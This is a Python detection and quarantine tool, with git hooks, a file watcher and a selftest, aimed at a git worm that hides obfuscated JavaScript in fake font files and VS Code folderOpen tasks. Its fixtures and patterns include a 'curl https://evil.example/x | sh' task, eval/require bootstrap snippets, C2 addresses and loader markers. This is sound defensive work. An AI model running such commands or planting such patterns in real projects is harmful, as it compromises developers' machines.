#!/usr/bin/env python3
"""fontguard: catch the git-worm that spreads through VS Code auto-run tasks and config files.

The worm commits a hidden .vscode/tasks.json task (runOn=folderOpen) that runs
`node ./public/fonts/<name>`, where the "font" is obfuscated JavaScript, and appends
payloads to config files (eslint, vite, postcss, tailwind...) after a long run of
blank space so editors never show them. Filenames and strings rotate, so fontguard
checks the technique:

  1. a folderOpen task that runs node on a non-script file, or downloads/decodes code
  2. a font-named file (.woff/.woff2/.ttf/.otf/.eot, .lfk/.lkf/.llf/.fml) that is plain
     text: real fonts are binary and always contain NUL bytes
  3. code pushed off-screen after a long run of blank space in JS/TS files
  4. a committed .vscode/settings.json that switches auto-run tasks back on
  5. the ~/.node_modules loader, known C2 addresses and campaign markers

Usage:
  fontguard.py scan [--quarantine] [PATH ...]
                                      report (or move) infected files under PATH (default: .)
  fontguard.py hook pre-commit        block a commit that stages the payload
  fontguard.py hook pre-push          block a push that adds the payload
  fontguard.py hook post-checkout     quarantine the payload after clone/checkout/pull
  fontguard.py watch [PATH ...]       stay resident (macOS) and quarantine the payload the
                                      moment it lands on disk: zip, copy, AirDrop, any tool
  fontguard.py procs                  report running processes that behave like the worm
  fontguard.py selftest | --version
"""
import os
import re
import shutil
import subprocess
import sys
import time

__version__ = "1.1.0"

FONT_EXTS = {".woff", ".woff2", ".ttf", ".otf", ".eot"}
ODD_EXTS = {".lfk", ".lkf", ".llf", ".fml"}
SCRIPT_EXTS = {".js", ".mjs", ".cjs", ".ts"}
CODE_EXTS = {".js", ".mjs", ".cjs", ".ts", ".mts", ".cts", ".jsx", ".tsx"}
# Variant 2: payload appended to a config file after hundreds of tabs/spaces, off-screen in editors.
# The gap must follow code on the same line (`);<tabs>payload`): deep indentation at the start
# of a line is normal in formatted SDKs. Padded Markdown tables in doc comments end in "|".
HIDDEN_CODE = re.compile(rb"\S[ \t]{150,}[^\s|*/][^\n]{19,}")
# Shorter padding (50+) is enough when the worm's bootstrap follows it; on a line of its own
# only the unmistakable global/eval bootstrap counts.
HIDDEN_BOOTSTRAP = re.compile(rb"\S[ \t]{50,}(global\s*(\.|\[)|eval\s*\(|require\s*\(|\(function\s*\()"
                              rb"|^[ \t]{50,}(global\s*(\.|\[)|eval\s*\()", re.MULTILINE)
# Loader, C2s and campaign markers (ours: 95.135.181.151; the published write-up: 166.88.54.158).
LOADER = re.compile(rb"npm-ws|95\.135\.181\.151|166\.88\.54\.158|trongrid\.io|bsc-dataseed|_\$_1e42"
                    rb"|global\s*\[\s*['\"](_V|_t_t)['\"]\s*\]|global\.i\s*=\s*['\"]A\d")
# A committed workspace setting that switches folderOpen auto-run back on.
AUTO_TASKS_ON = re.compile(rb"\"task\.allowAutomaticTasks\"\s*:\s*(true|\"on\")")
SKIP_DIRS = {"node_modules", ".git", ".Trash", ".cache", ".npm", ".pnpm-store"}
QUARANTINE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "quarantine")
# Never walk system areas, ~/Library (by full path: a repo may have its own Library/ folder),
# our own quarantine, or the firmlinked duplicate of the data volume.
SKIP_PATHS = {"/System", "/dev", "/Volumes", "/private/var", "/cores", QUARANTINE, os.path.expanduser("~/Library")}
# App and framework bundles are signed: moving a file out of one breaks the app, and the worm targets repos.
SKIP_BUNDLES = (".app", ".framework", ".bundle", ".xcframework", ".appex")

# Process rules: payload files rotate, but the running worm behaves the same way.
RUNTIMES = ("node", "python", "osascript", "curl", "deno", "bun")
PROC_RULES = [
    (re.compile(r"\s-e\s.*global\s*\[\s*['\"]\w+['\"]\s*\]\s*=.*require"), "inline loader (node -e global[...] = require)"),
    (re.compile(r"\.node_modules/\.npm-ws"), "~/.node_modules loader"),
    (re.compile(r"95\.135\.181\.151|166\.88\.54\.158"), "talks to a known C2 server"),
]

MARKER = re.compile(rb"global\s*\[\s*['\"]!['\"]\s*\]\s*=")
NODE_TARGET = re.compile(r"\b(?:node(?:\.exe)?|bun|deno(?:\s+run)?)\s+[\"']?([^\s\"')|&;]+)")
FETCH_DECODE = re.compile(r"\b(curl|wget|Invoke-WebRequest|iwr|base64\s+-d|eval)\b", re.IGNORECASE)


def normpath(p):
    """'/System/Volumes/Data/Users/x' is the same file as '/Users/x'; keep the short form."""
    p = os.path.abspath(p)
    return p[len("/System/Volumes/Data"):] if p.startswith("/System/Volumes/Data/") else p


def is_candidate(path):
    p = path.replace("\\", "/")
    ext = os.path.splitext(p)[1].lower()
    return (p.endswith((".vscode/tasks.json", ".vscode/settings.json")) or ext in FONT_EXTS
            or ext in ODD_EXTS or ext in CODE_EXTS or "/.node_modules/.npm-ws" in p)


def strip_jsonc(s):
    """Drop // and /* */ comments outside strings, then trailing commas."""
    out, i, n, in_str = [], 0, len(s), False
    while i < n:
        c = s[i]
        if in_str:
            out.append(c)
            if c == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 1
            elif c == '"':
                in_str = False
        elif c == '"':
            in_str = True
            out.append(c)
        elif s.startswith("//", i):
            while i < n and s[i] != "\n":
                i += 1
            continue
        elif s.startswith("/*", i):
            end = s.find("*/", i + 2)
            i = n if end == -1 else end + 2
            continue
        else:
            out.append(c)
        i += 1
    return re.sub(r",\s*([}\]])", r"\1", "".join(out))


def check_tasks(text):
    import json
    try:
        tasks = json.loads(strip_jsonc(text)).get("tasks", [])
    except (ValueError, AttributeError):
        # Unparseable: fall back to the raw text so a broken file can't hide a task.
        tasks = [{"command": text, "runOptions": {"runOn": "folderOpen"}}] if "folderOpen" in text else []
    for t in tasks if isinstance(tasks, list) else []:
        if not isinstance(t, dict) or (t.get("runOptions") or {}).get("runOn") != "folderOpen":
            continue
        args = t.get("args") or []
        cmd = " ".join([str(t.get("command") or "")] + [str(a) for a in args if isinstance(a, (str, int))])
        for target in NODE_TARGET.findall(cmd):
            if target.startswith(("-", ">", "<", "&", "|", "2>")):
                continue  # a flag or a redirect, as in `command -v node >/dev/null`
            if "/fonts/" in target or os.path.splitext(target)[1].lower() not in SCRIPT_EXTS:
                return f"folderOpen task runs node on non-script file {target}"
        if FETCH_DECODE.search(cmd):
            return "folderOpen task downloads or decodes code"
    return None


def check(path, data):
    """Return a reason string if this file is the payload or its trigger, else None."""
    p = path.replace("\\", "/")
    if p.endswith(".vscode/tasks.json"):
        return check_tasks(data.decode("utf-8", "replace"))
    if p.endswith(".vscode/settings.json"):
        return "workspace setting re-enables auto-run tasks" if AUTO_TASKS_ON.search(data) else None
    ext = os.path.splitext(p)[1].lower()
    head = data[:4096]
    if "/.node_modules/.npm-ws" in p:
        return "malware loader file in ~/.node_modules"
    if (ext in FONT_EXTS or ext in ODD_EXTS) and head and b"\x00" not in head:
        return f"text file disguised as a font ({ext})"
    if MARKER.search(data[:65536]):
        return "payload marker global['!'] ="
    if LOADER.search(data):
        return "malware loader marker (npm-ws / C2 95.135.181.151)"
    if ext in CODE_EXTS and (HIDDEN_CODE.search(data) or HIDDEN_BOOTSTRAP.search(data)):
        return "code hidden off-screen after a long run of blank space"
    return None


def git(*args):
    return subprocess.run(["git", *args], capture_output=True, check=False).stdout


def scan_tree(read, paths):
    hits = []
    for p in paths:
        if is_candidate(p):
            data = read(p)
            reason = check(p, data) if data is not None else None
            if reason:
                hits.append((p, reason))
    return hits


def report(hits, where):
    for p, reason in hits:
        print(f"🚨 [fontguard] {where}{p}: {reason}", file=sys.stderr)


def hook_pre_commit():
    paths = [p for p in git("diff", "--cached", "--name-only", "--diff-filter=ACM", "-z").decode().split("\0") if p]
    hits = scan_tree(lambda p: git("show", f":{p}"), paths)
    if hits:
        report(hits, "staged ")
        print("💀 Commit blocked by fontguard: these files match the git-worm malware.", file=sys.stderr)
        return 1
    return 0


def hook_pre_push():
    hits = []
    for line in sys.stdin.read().splitlines():
        parts = line.split()
        if len(parts) < 2 or set(parts[1]) == {"0"}:
            continue  # branch deletion
        sha, remote = parts[1], parts[3] if len(parts) > 3 else "0"
        if set(remote) != {"0"} and git("cat-file", "-t", remote).strip() == b"commit":
            # only what this push adds: keeps pushes fast now that every JS file is a candidate
            paths = [p for p in git("diff", "-z", "--name-only", "--diff-filter=ACMR", remote, sha).decode().split("\0") if p]
        else:
            paths = [p for p in git("ls-tree", "-r", "-z", "--name-only", sha).decode().split("\0") if p]
        hits += [(f"{parts[0]}:{p}", r) for p, r in scan_tree(lambda p, s=sha: git("cat-file", "blob", f"{s}:{p}"), paths)]
    if hits:
        report(hits, "push ")
        print("💀 Push blocked by fontguard: remove the payload before pushing.", file=sys.stderr)
        return 1
    return 0


def hook_post_checkout(args):
    """post-checkout gets (previous HEAD, new HEAD, flag); post-merge is passed (ORIG_HEAD, HEAD)."""
    top = git("rev-parse", "--show-toplevel").decode().strip()
    if not top:
        return 0
    prev, new = [*args, "0", "0"][:2]
    if set(prev) != {"0"} and git("cat-file", "-t", prev).strip() == b"commit":
        # only what this checkout or pull brought in: a monorepo pull stays fast
        changed = git("-C", top, "diff", "-z", "--name-only", "--diff-filter=ACMR", prev, new)
        paths = [p for p in changed.decode().split("\0") if p]
    else:
        paths = [p for p in git("-C", top, "ls-files", "-z").decode().split("\0") if p]  # a fresh clone

    def read(p):
        try:
            with open(os.path.join(top, p), "rb") as f:
                return f.read(1 << 20)  # same cap as scan and watch: the payload sits in small config files
        except OSError:
            return None

    hits = scan_tree(read, paths)
    if not hits:
        return 0
    dest = quarantine(top, os.path.basename(top), [p for p, _ in hits])
    report(hits, "")
    print(f"🛡️  [fontguard] Moved {len(hits)} file(s) out of {top} into {dest} before an editor can run them.\n"
          f"    Do not open this repo's old copy in VS Code. Commit the removal and tell the repo owner.", file=sys.stderr)
    return 0  # post-checkout cannot block; quarantining is the interception


def quarantine(base, label, rel_paths):
    """Move base/<rel> into QUARANTINE/<timestamp>/<label>/<rel>, keeping a copy for review."""
    dest = os.path.join(QUARANTINE, time.strftime("%Y%m%d-%H%M%S"), label)
    for rel in rel_paths:
        os.makedirs(os.path.dirname(os.path.join(dest, rel)), exist_ok=True)
        shutil.move(os.path.join(base, rel), os.path.join(dest, rel))
    return dest


def suspicious_processes(ps_text, me):
    """ps_text: `ps -axww -o pid=,ppid=,command=` output. Returns [(pid, reason)]."""
    procs = {}
    for line in ps_text.splitlines():
        parts = line.split(None, 2)
        if len(parts) == 3 and parts[0].isdigit() and parts[1].isdigit():
            procs[int(parts[0])] = (int(parts[1]), parts[2])
    hits = []
    for pid, (ppid, cmd) in procs.items():
        exe = os.path.basename(cmd.split()[0])
        if pid == me or not exe.startswith(RUNTIMES):
            continue  # shells and greps that merely mention a pattern are left alone
        reason = next((why for rx, why in PROC_RULES if rx.search(cmd)), None)
        if not reason and exe == "osascript" and "NSPasteboard" in cmd and "changeCount" in cmd:
            parent = os.path.basename(procs.get(ppid, (0, "?"))[1].split()[0])
            if ppid == 1 or parent.startswith("node"):
                reason = "clipboard stealer (osascript polling the pasteboard)"
        if reason:
            hits.append((pid, f"{exe}: {reason}"))
    return hits


def cmd_procs():
    """Report running processes that behave like the worm. Read-only: nothing is stopped."""
    out = subprocess.run(["ps", "-axww", "-o", "pid=,ppid=,command="], capture_output=True, text=True, check=False).stdout
    hits = suspicious_processes(out, os.getpid())
    for pid, reason in hits:
        print(f"🚨 [fontguard] process {pid}: {reason}", file=sys.stderr)
    print(f"fontguard: {len(hits)} suspicious process(es).", file=sys.stderr)
    return 1 if hits else 0


def notify(msg):
    msg = msg.replace("\\", "/").replace('"', "'")  # keep the AppleScript string well-formed
    subprocess.run(["osascript", "-e", f'display notification "{msg}" with title "fontguard blocked malware"'],
                   capture_output=True, check=False)


def cmd_watch(roots):
    """Stay resident on macOS FSEvents: the kernel pushes changes, so idle cost is ~0 CPU."""
    import ctypes
    cf = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
    cs = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/CoreServices.framework/CoreServices")
    vp = ctypes.c_void_p
    cf.CFStringCreateWithCString.restype = vp
    cf.CFStringCreateWithCString.argtypes = [vp, ctypes.c_char_p, ctypes.c_uint32]
    cf.CFArrayCreate.restype = vp
    cf.CFArrayCreate.argtypes = [vp, ctypes.POINTER(vp), ctypes.c_long, vp]
    cf.CFRunLoopGetCurrent.restype = vp
    callback_t = ctypes.CFUNCTYPE(None, vp, vp, ctypes.c_size_t, ctypes.POINTER(ctypes.c_char_p),
                                  ctypes.POINTER(ctypes.c_uint32), ctypes.POINTER(ctypes.c_uint64))
    cs.FSEventStreamCreate.restype = vp
    cs.FSEventStreamCreate.argtypes = [vp, callback_t, vp, vp, ctypes.c_uint64, ctypes.c_double, ctypes.c_uint32]
    cs.FSEventStreamSetExclusionPaths.argtypes = [vp, vp]
    cs.FSEventStreamScheduleWithRunLoop.argtypes = [vp, vp, vp]
    cs.FSEventStreamStart.argtypes = [vp]

    def cfarray(paths):
        items = (vp * len(paths))(*[cf.CFStringCreateWithCString(None, p.encode(), 0x08000100) for p in paths])
        return cf.CFArrayCreate(None, items, len(paths), ctypes.addressof(vp.in_dll(cf, "kCFTypeArrayCallBacks")))

    home = os.path.expanduser("~")
    roots = [os.path.abspath(r) for r in (roots or [home])]
    noisy = ("/node_modules/", "/.git/", QUARANTINE + "/")

    def on_events(_stream, _info, n, paths, _flags, _ids):
        moved = []
        for i in range(n):
            p = paths[i].decode("utf-8", "replace")
            if not is_candidate(p) or any(s in p + "/" for s in noisy) or not os.path.isfile(p):
                continue
            try:
                with open(p, "rb") as fh:
                    reason = check(p, fh.read(1 << 20))
                if reason:
                    dest = quarantine("/", "watch", [normpath(p).lstrip("/")])
                    print(f"🛡️  [fontguard] {p}: {reason} -> moved to {dest}", file=sys.stderr, flush=True)
                    moved.append(p)
                    if "loader" in reason:
                        # the loader may already be running: stop it, judged by the same rules as `procs`
                        ps = subprocess.run(["ps", "-axww", "-o", "pid=,ppid=,command="],
                                            capture_output=True, text=True, check=False).stdout
                        for pid, why in suspicious_processes(ps, os.getpid()):
                            try:
                                os.kill(pid, 9)
                                print(f"🛡️  [fontguard] process {pid}: {why} -> stopped", file=sys.stderr, flush=True)
                            except OSError:
                                pass
            except OSError as e:
                # vanished mid-event, or macOS privacy (TCC) blocked the read: log it, never die
                print(f"fontguard: could not check {p}: {e}", file=sys.stderr, flush=True)
        if moved:  # one banner per burst, not one per file: a pull can bring in dozens at once
            names = ", ".join(os.path.basename(m) for m in moved[:3])
            more = f" and {len(moved) - 3} more" if len(moved) > 3 else ""
            notify(f"Quarantined {len(moved)} file(s): {names}{more}")

    cb = callback_t(on_events)  # keep a reference so it is not garbage-collected
    # NoDefer 0x2 | IgnoreSelf 0x8 | FileEvents 0x10; latency 1s coalesces bursts like npm installs
    stream = cs.FSEventStreamCreate(None, cb, None, cfarray(roots), 0xFFFFFFFFFFFFFFFF, 1.0, 0x2 | 0x8 | 0x10)
    excluded = [x for x in (os.path.join(home, "Library"), os.path.join(home, ".Trash"), QUARANTINE)
                if any(x.startswith(r + "/") for r in roots)]
    if excluded:
        cs.FSEventStreamSetExclusionPaths(stream, cfarray(excluded))
    cs.FSEventStreamScheduleWithRunLoop(stream, cf.CFRunLoopGetCurrent(), vp.in_dll(cf, "kCFRunLoopDefaultMode"))
    cs.FSEventStreamStart(stream)
    print(f"fontguard: watching {', '.join(roots)}", file=sys.stderr, flush=True)
    cf.CFRunLoopRun()
    return 0


def cmd_scan(roots):
    move = "--quarantine" in roots
    roots = [r for r in roots if r != "--quarantine"]
    hits = []
    for given in roots or ["."]:
        root = normpath(given)
        if any(root == s or root.startswith(s + "/") for s in SKIP_PATHS):
            print(f"fontguard: skipping {root} (system area or quarantine)", file=sys.stderr)
            continue
        for d, dirs, files in os.walk(root):
            dirs[:] = [x for x in dirs if x not in SKIP_DIRS and not x.endswith(SKIP_BUNDLES)
                       and os.path.join(d, x) not in SKIP_PATHS]
            for f in files:
                p = os.path.join(d, f)
                if not is_candidate(p):
                    continue
                try:
                    with open(p, "rb") as fh:
                        data = fh.read(1 << 20)
                except OSError:
                    continue
                reason = check(p, data)
                if reason:
                    hits.append((p, reason))
    persist = os.path.expanduser("~/.node_modules")
    if os.path.isdir(os.path.join(persist, "node_modules", "socket.io-client")):
        hits.append((persist, "known persistence folder with socket.io-client backdoor"))
    report(hits, "")
    if move:
        for p, _ in hits:
            dest = quarantine("/", "scan", [normpath(p).lstrip("/")])
            print(f"🛡️  [fontguard] {p} -> moved to {dest}", file=sys.stderr)
    print(f"fontguard: {len(hits)} finding(s).", file=sys.stderr)
    return 1 if hits else 0


def selftest():
    bad_tasks = (b'{"tasks":[{"label":"eslint-check","type":"shell",'
                 b'"command":"(command -v node && node ./public/fonts/fa-solid.lfk) || echo \'\'",'
                 b'"runOptions":{"runOn":"folderOpen"}},]}')
    good_tasks = (b'{"tasks":[{"label":"watch","command":"npm run watch","runOptions":{"runOn":"folderOpen"}},'
                  b'{"label":"x","command":"node build.js"}]} // ok')
    url_tasks = b'{"tasks":[{"command":"curl https://evil.example/x | sh","runOptions":{"runOn":"folderOpen"}}]}'
    assert check(".vscode/tasks.json", bad_tasks), "missed fake-font task"
    assert check("a/.vscode/tasks.json", url_tasks), "missed download task"
    exe_tasks = b'{"tasks":[{"command":"node.exe ./public/fonts/fa-solid-400.woff2","runOptions":{"runOn":"folderOpen"}}]}'
    assert check(".vscode/tasks.json", exe_tasks), "missed node.exe variant"
    assert check(".vscode/tasks.json", good_tasks) is None, "flagged a normal task"
    probe = b'{"tasks":[{"command":"command -v node >/dev/null && node build.js","runOptions":{"runOn":"folderOpen"}}]}'
    assert check(".vscode/tasks.json", probe) is None, "flagged a redirect as a node target"
    assert "fa-solid.lfk" in check(".vscode/tasks.json", bad_tasks), "wrong target reported"
    assert check("public/fonts/fa-solid-400.woff2", b"\t\t\tglobal['!'] = '8-&&';var a=1;"), "missed text woff2"
    assert check("public/fonts/fa-solid.lfk", b"var x=require('fs')"), "missed odd extension"
    assert check("public/fonts/fa-solid-900.woff2", b"wOF2\x00\x01\x00\x00" + b"\x00" * 64) is None, "flagged a real font"
    assert check("public/fonts/empty.woff2", b"") is None, "flagged an empty file"
    assert check("src/x.js", b"// nothing here") is None
    hidden = b"export default config(\n  {},\n);" + b"\t" * 400 + b"global['r']=require;eval(x)"
    assert check("apps/web/eslint.config.js", hidden), "missed off-screen payload in config"
    assert check("src/app.ts", b"function f() {\n" + b"    " * 6 + b"return 1;\n}\n") is None, "flagged normal indentation"
    short_pad = b"export default { plugins: {} };" + b" " * 60 + b"global.i='A8-3997-1';global.r=require;"
    assert check("postcss.config.js", short_pad), "missed 50-space padding variant"
    assert check(".vscode/settings.json", b'{\n  "task.allowAutomaticTasks": true\n}'), "missed auto-run setting"
    assert check(".vscode/settings.json", b'{"task.allowAutomaticTasks": "off"}') is None, "flagged a safe setting"
    assert check("src/routes/auth.js", b"const h = '166.88.54.158';"), "missed published C2"
    assert check("src/align.js", b"const x = 1;" + b" " * 60 + b"// aligned comment\n") is None, "flagged aligned comment"
    deep = b"var a=function(g){\n" + b" " * 160 + b"return d(g)&&x(g,function(){return 1})\n}"
    assert check("sdk/omsdk-v1.6.2.js", deep) is None, "flagged deep indentation in a formatted SDK"
    assert check("tail.js", b"module.exports = {}\n" + b" " * 80 + b"global['r']=require;eval(p)"), "missed own-line bootstrap"
    assert normpath("/System/Volumes/Data/Users/x/a.js") == "/Users/x/a.js"
    ps = (
        "  101     1 node -e global['_V']='A8-2507';global['r']=require;var x=1\n"
        "  102   101 osascript -l JavaScript -e ObjC.import('AppKit'); var pb = $.NSPasteboard.generalPasteboard;"
        " pb.changeCount\n"
        "  103     1 /opt/homebrew/bin/node /Users/x/.node_modules/.npm-ws-runner.js\n"
        "  104     1 /bin/zsh -c grep -E 'global\\[.r.\\]=require' 95.135.181.151\n"
        "  105     1 node /Users/x/app/node_modules/.bin/vite --port 5173\n"
        "  106     1 osascript -e display notification \"hi\"\n"
        "  107     1 python3 /Users/x/.fontguard/fontguard.py watch\n"
    )
    flagged = {pid for pid, _ in suspicious_processes(ps, me=107)}
    assert flagged == {101, 102, 103}, f"process rules picked {sorted(flagged)}"
    table = b"  * | `type` property | Description" + b" " * 280 + b"|\n  * |---|---|\n"
    assert check("refs/plugin-api.d.ts", table) is None, "flagged a padded Markdown table in a doc comment"
    assert check("/Users/x/.node_modules/.npm-ws-runner.js", b"anything"), "missed loader file"
    assert check("tools/run.js", b'var c={"_t_s":"http://95.135.181.151:443"}'), "missed C2 marker"
    print("fontguard selftest: ok")
    return 0


def main(argv):
    if len(argv) >= 2 and argv[1] == "selftest":
        return selftest()
    if len(argv) >= 2 and argv[1] == "scan":
        return cmd_scan(argv[2:])
    if len(argv) >= 2 and argv[1] == "watch":
        return cmd_watch(argv[2:])
    if len(argv) >= 2 and argv[1] == "procs":
        return cmd_procs()
    if len(argv) >= 2 and argv[1] == "--version":
        print(f"fontguard {__version__}")
        return 0
    if len(argv) >= 3 and argv[1] == "hook":
        hooks = {"pre-commit": lambda _a: hook_pre_commit(), "pre-push": lambda _a: hook_pre_push(),
                 "post-checkout": hook_post_checkout, "post-merge": lambda _a: hook_post_checkout(["ORIG_HEAD", "HEAD"])}
        return hooks.get(argv[2], lambda _a: 0)(argv[3:])
    print(__doc__, file=sys.stderr)
    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv))
